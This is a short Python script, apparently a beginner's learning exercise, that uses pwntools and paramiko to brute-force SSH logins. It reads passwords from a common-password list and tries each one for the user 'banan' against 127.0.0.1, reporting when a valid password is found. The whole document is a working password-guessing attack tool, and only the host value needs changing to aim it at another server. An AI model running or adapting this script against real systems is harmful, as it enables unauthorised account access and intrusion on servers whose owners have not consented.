from pwn import *
import paramiko#error handling

host="127.0.0.1" #brute force for this host
username="banan"
attempts=0 #keep log of number of hosts attemps here we will know how many requests it's taken for us to be able to authentic.


with open("ssh-common-password.txt","r") as password_list:#read 
	for password in password_list:
		password=password.strip("\n")
		try:#we use it for handling error authentication error.
			print("[{}] Attempting password: '{}'!".format(attempts,password))
			response=ssh(host=host,user=username,password=password,timeout=1)#making ssh connection
			if response.connected():#if authenticated connect done
				print("[>] valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts+=1
